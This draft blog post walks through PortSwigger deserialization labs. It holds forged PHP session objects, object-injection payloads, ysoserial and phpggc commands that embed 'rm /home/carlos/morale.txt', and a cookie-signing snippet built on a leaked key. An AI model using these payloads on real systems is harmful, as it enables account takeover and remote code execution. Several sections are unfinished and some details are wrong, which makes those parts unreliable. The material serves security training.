---
title: "Insecure Deserialization"
date: 2025-07-14T16:59:32+03:00
draft: true
authors: [Thuri]
lightgallery: true
tags: ["appsec", "websec", "portswigger", "java"]
summary: "Deserialization."
toc:
    enable: true
    auto: false

description: "Deserialize"
---

## Introduction

Serialization is the process of converting memory objects into a text or binary format output while Deserialization is process of loading back the serialied data back in memory . The serialized data form could be text-based such as JSON or XML or a binary format.

Insecure deserialization occurs when attacker controlled data is deserialized by the website allowing an attacker to manipulate serialized objects in order to pass harmful data.

The vulnerabilities due to insecure deserialization of attacker controlled data can lead to Remote Code Execution (RCE), Privilege Esclation, Arbitrary class aacess, and even Denial of Service attacks. The deserialization attacks today are also made possible due to higher of dependencies or frameworks exists in the modern websites. This creates a problem of massive classes and objects as they increase the attack surface.

> [!TIP]
> When hunting for Insecure Deserialization, Look for the data passed into the website that is user controlled and looks like serialized data.

To understand the insecure deserialization, this blog will attempt solve the deserialization challenges/labs by [Portswigger Academy (Deserialization)](https://portswigger.net/web-security/deserialization). The challenges shows various insecure implementation of data deserialization in Java, PHP and Java Languages.

### PHP Serialization

PHP uses human-readable string format, with letters representing data type and numbers representing the length of each entry. For example an `User` object with the attributes. The native methods for PHP serialization are `serialize()` and `unserialize()`. When code auditing `PHP` applications, start by looking for `unserialize()` anywhere in the code and investigating further.

The example below shows how php data is serialized.

```php
$User->name ="carlos";
$User->isLoggedIn = true;
```

When serialized, this object may look like this;

```json
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

Serialization is very useful in storing or passing PHP values around without loosing their type and structure.

> [!Important]
> When serializing objects, PHP will attempt to call the member functions `__serialize()` or `__sleep()` prior to serialization. This is to allow the object to do any last minute clean-up, etc. prior to being serialized. Likewise, when the object is restored using `unserialize()` the `__unserialize()` or `__wakeup()` member function is called.

#### Phar Format

Phar is a short form for PHP Archive. PHar file are means to distribute PHP applications and libraries as single application. Addittionaly, Phar archives can executed by PHP as any other file.

Phar implements the functionality using Stream wrappers. Example of accessing the external files using include

```php
<?php
include '/path/to/externa/file.php';
>
```

The Phar stream wrapper fully supports `fopen()` for read and write(not append),`unlink()`, `stat()`, `fstat()`, `fseek()`, `rename()` and directory stream operations `opendir()`, `rmdir`, and `mkdir()`.

All the Phar archives contain three to four sections:

1. A stub
2. A manifest describing the content
3. The file contents
4. A signature verifying Phar Intergrity [optional]

### Java serialization

Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.

Any class that implements the interface java.io.Serializable can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an InputStream.

To implement a serializable class object in Java, one needs to implement the `java.io.Serializable` interface. Example as shown below

```java
public class User implements Serializable {
    // Code implementation
}
```

### Magical methods

Magical methods are a subset of methods that are invoked automatically whenever a particular event or scenario occurs. one of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instatiniated. Constructor magic method contain code to initialize the attributes of the instance. The magic methods can also be customized by the developers to execute any code they want.

Magic methods can become dangerous when the code that they execute handles attacker-controlled data, for example from a deserialid object. Therefore, an attacker can automatically invoke methods on deserilized data when all conditions are met.

In PHP, `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.
In java deserializtion, the same applies to `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object.

When doing code audits of website testing, pay close attention to any classes that contain types of magic methods. They allow passing of user-controlled data from a serialized object into website's code before the object is fully deserialized.

#### Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. Construction of gadget chains is completely unrelated to what code or libraries your application invokes.

### Ruby serialization

Ruby deserialization is the process of converting serialied data into ruby objects, often using formats like YAML, Marshal, or JSON.

## Exploitation

To exploit a deserialization vulnerability, the following conditions are key:

1. An attacker controlled entry point to send serialized object to be deserialized by the application.
2. Use of serialization libraries without data validation.

The following are different labs provided by Portswigger Academy.

### Modifying serialized objects

> [!Note]
> This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

The goal of the challenge is to access the `/admin` panel and delete the user carlos. First is to login into the application as `wiener` using the following credentials `wiener:peter`. After a successful login, one can modify the `session cookie` which is vulnerable to the deserialization cookie.

The session cookie is url encoded and base64 encoded as shown in the image below in the Burp Decoder.

![User login deserialization](/deserialization/image.png)

Burp Decoder is a tool within BurpSuite that allows one to encode, decode and manipulate the data. To solver the lab we can modify the data by setting admin boolean value to `True` as shown in the JSON data below.

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

After modifying this, base64 encode, and url encode and and replace the session cookie in the `HEADER`. Replaying the request with the repeater, we are able to bypass the auth mechanism and access the admin panel.

![Delete user](/deserialization/image-1.png)

By changing the path in our request to `/admin/delete?username=carlos`, we are able to

### Modifying serialized data types

> [!Note]
> This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.

The challenge is similiar to the previous challenge on modifying serialized objects. The serialized objec is a JSON with now an `access_token` for authentication.

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"uk17cesyh3gxjz6w5zuy2n7plq7z2kfr";}
```

To bypass the authentication mechanism, we need to modify the object `username` and `access_token`. This is as only administrator are allowed to access the `/admin` route. Second to modify the `access_token` value from a string to an Interger as shown in the modified JSON data below.

```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

By URL and Base64 encoding the above data, and replacing the original cookie with the modified one we are able to bypass the employed mitigations.

The base64 encoded data to replace the token is:

```json
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

Replaying the request, we are able to access the admin panel as shown in the image below.

![Modify object](/deserialization/lab2-sol.png)

By replacing the Request path with `/admin/delete?username=carlos` and replaying the request, we are able to delete the user and solve the challenge.

### Using application functionality to exploit insecure deserialization

> [!Note]
> This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

The vulnerable entrypoint of the application is similiar to the previous ones being `session` cookie. The goal of this challenge is to delete the file `morale.txt` in the `carlos` home directory. In linux filesystem the path to the file will be `/home/carlos/morale.txt`.

The decoded session for the challenge is as shown in the JSON below.

```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ch4xnyx73qb141w23dkvio0qih1c5lqe";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

The website has a feature to upload an avatar to the user profile with is shown in the `avatar_link` object property
First upload the avatar to the profile to get the `avatar_link` object property.

To exploit the code we can exploit this, by changing the avatar link to file to delete and deleting the account.

```json
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ui29nhrc99fmqc7m9upcp3140h4tjnca";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

By deleting the user account `gregg` with the modified `access_token` we are also able to delete `morale.txt` file.

### Arbitrary object injection in PHP

> [!Note]
> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

The first goal in solving the challenge is to get access to the source code of the application. By looking at the source file of the home page were are able to identify one of the libraries `/libs/CustomTemplate.php` leaked in the comment as shown below.

```html
 </a>
    </div>
        </section>
        <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
    </div>
</section>
```

Next step it to examine the analyze the source.

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

In the look of the source code, it has two magic methods, `__construct()` and `__destruct()` which are executed at the start and end of the code execution respectively. For the ability to inject arbitrary objects, we can make to delete the `/home/carlos/morale.txt`.

The PHP class `__destruct` is the one that deletes the file using `lock_file_path` if it exists. We can set `lock_file_path` and file is `/home/carlos/morale.txt` in the custom serialized object as shown below.

```json
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

To replace our session cookie with new serialized data, we nee first to base64 and then url encode data.

By sending the above exploit, we are able to delete the file even if there is an error on the response as shown below.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Invalid user in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

### Exploiting Java deserialization with Apache Commons

> [!Note]
> This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

Apache Commons is a collection of libraries that provide helper utilities, extensions to the Java Standard library, and commonly used functions. In respect to this the Common Collection libraries contain "dangerous chains" that can exploited through Java deserialization attacks.

The goal of the challenge is to exploit the challenge using a pre-built gadget chain generated by third-party tools to delete `/home/carlos/morale.txt` file. The vulnerability is in the session cookie.

First, Login in the application so as to get the session cookie which is our entry point for the attack. The example serialized token is like this

```json
¬í sr /lab.actions.common.serializable.AccessTokenUserQüå'© L accessTokent Ljava/lang/String;L usernameq ~ xpt  wt5l7xob2ms35ux1otuo5v21018hygh7t wiener
```

From, the details above reveal the website is using common library. Some of the identifyable information are class is `User`, `username` and `AccessToken` properties.

Since the challenge, can be exploited using a pre-built gadget chai, we use `yoserial` tool to generate a payload as shown in the command below.

```sh
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```

The payload for our chain will be the exact commoncollections library and command be `rm /home/carlos/morale.txt`. To list the payloads in the tool we run the following command `java -jar ysoserial-all.jar`.

```bash
ysoserial ➤ java -jar ysoserial-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Jul 17, 2025 2:04:13 PM org.reflections.Reflections scan
INFO: Reflections took 359 ms to scan 1 urls, producing 18 keys and 153 values
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
```

We construct our exploit using `CommonsCollections2` and command `rm /home/carlos/morale.txt`

```bash
java -jar ysoserial-all.jar CommonsCollections2 'rm /home/carlos/morale.txt'
```

When running the above commands, the applications throws an error as shown below.

running this we encounter an error

```bash
ysoserial ➤ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x141803e1) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x141803e1
	at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

To solve this error, one of the solution is use the docker version of `ysoserial` using JDK8.

```bash
FROM openjdk:8-jdk-alpine
WORKDIR /app
COPY ./ysoserial-all.jar .
ENTRYPOINT ["java", "-jar", "ysoserial-all.jar"]
```

Run the container command as shown below.

```bash
docker run --rm ysoserial [Command]
```

Example of the generated payload is as shown in the image below.

![Payload xxd](/deserialization/ysoserial_xxd.png)

From the generated output, we need to url and base64 encode the payload to use as our new session.

```bash
docker run --rm ysoserial CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d "\n"
```

By replacing the session cookie with the generate payload, the applications throws an error and the lab is solved.

```html
<div class="container">
    <header class="navigation-header"></header>
    <h4>Internal Server Error</h4>
    <p class="is-warning">
        InstantiateTransformer: Constructor threw an exception
    </p>
</div>
```

### PHP deserialization with a pre-built gadget chain

> [!Note]
> This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains. To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

The goal of the challenge is to identify the framework used and use relevant gadget chain to exploit the insecure deserialization. To identify the framework, send a malformed session token to leak in the error as shown in the code below.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error: Symfony Version: 4.3.6</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Signature does not match session in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

Using the leaked server information `Symfony Version: 4.3.6` we can construct a payload to delete `morale.txt` file. Sending the modified session will throw an error because the token is signed.

Auditing the home page source, we see path `/cgi-bin/phpinfo.php` commented out. This path might key for signing our session by looking into the environment variables.

![PHP Environment](/deserialization/deserialize_env.png)

The `SECRET_KEY` is `ypecrm510xmjclhft3tm7ghwvid918cg`. Using this key we can our Sign our new session.

The cookie session is

```json
{
    "token": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5cnRjbHAzanM2Y3lxamthaWVidzUxcWU0eXRmMHl2eiI7fQ==",
    "sig_hmac_sha1": "ed4820140dfc3f05e4b17df34c8772f90ac0f02a"
}
```

To generate a new serialized session we use `phpgcc` to build our chain. `phpgc` is a tool to automate process of crafting gadgets chain in PHP.

```bash
 ./phpggc Symfony/rce9 exec "rm /hone/carlos/morale.txt" | base64 | tr  -d '\n'
```

Replace our token in the cookie with the new generated and replaying the request we get an error our signature does not match.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error: Symfony Version: 4.3.6</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Signature does not match session in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

This means our session is not valid and need to be signed using the key we leaked from the environment variables. The code to generate a signed token is:

```php
<?php
// Define the message and the secret key
$Token = "user_token";
$secretKey = "secret_env";
// Generate HMAC-SHA1 hash
$hmac = hash_hmac('sha1', $Token, $secretKey);
// Output the HMAC
echo "HMAC-SHA256: " . $hmac;
?>
```

By using the generated token, we are able to solve the lab by deleting the file.

### Ruby deserialization using a documented gadget chain

> [!Note]
> This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework. To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.You can log in to your own account using the following credentials: `wiener:peter`

The goal of this challenge was to understand the ruby and exploit

The first step is to look at the structure of the session cookie

```json
o:	User:@usernameI"wiener:EF:@access_tokenI"%psf4s581h6ln3feybwaqbuayb48eggsk;F
```

then we do an alter of the cookie to get an error

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error</h4>
    <p class="is-warning">
        index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t
        be read) (TypeError) format version 4.8 required; 37.48 given from
        -e:13:in `&lt;main&gt;&apos;
    </p>
</div>
```

### Developing a custom gadget chain for Java deserialization

> [!Note]
> This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete carlos. You can log in to your own account using the following credentials: `wiener:peter`

The goal of this challenge/lab is to create a custom chain to be an administrator and delete the user `carlos`. First step is look for the session format by logging in as `wiener:peter`.

```json
¬í sr /lab.actions.common.serializable.AccessTokenUserQüå'© L accessTokent Ljava/lang/String;L usernameq ~ xpt  bm4u52pogt2p0ggrlpeyyrw9ldkkhqrpt wiener
```

The session implements the common Apache collections libraries as part of the serizalization-based mechanism. Looking at the source code of the home page we are able to leak information of source code.

```html
</section>
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
</div>
```

The source code is at `/backup/AccessTokenUser.java`

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

The class `AccessTokenUser` serializes the `username` and `accessToken` as shown in the code. By looking in `/backup` directory, we have another file which is `/backup/ProductTemplate.java`.

The code for `/backup/ProductTemplate.java` is:

```java
public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

### Developing a custom gadget chain for PHP deserialization

> [!Note]
> This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.You can log in to your own account using the following credentials: `wiener:peter`

First step is to look at the source code of the website

```html
</section>
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
</div>
```

Check the `/cgi-bin/libs/CustomTemplate.php` file and append `~` to view the source

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

To construct the chain from this one we can do the following

```php
CustomTemplate->default_desc_type ="rm /home/carlos/morale.txt";

```

### Using PHAR deserialization to deploy a custom gadget chain

> [!Note]
> This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain. To solve the lab, delete the `morale.txt` file from Carlos's home directory. You can log in to your own account using the following credentials: `wiener:peter`

What is `Phar` - explain

in the looking for `/cgi-bin` diretcory, we get two files source code

```php
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

and the second source code is

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

## References

1. [PHPGCC](https://github.com/ambionics/phpggc) - PHP Generic Gadget Chains
2. [ysoserial](https://github.com/frohoff/ysoserial) - Unsafe Java object deserialization proof-of-concept tool
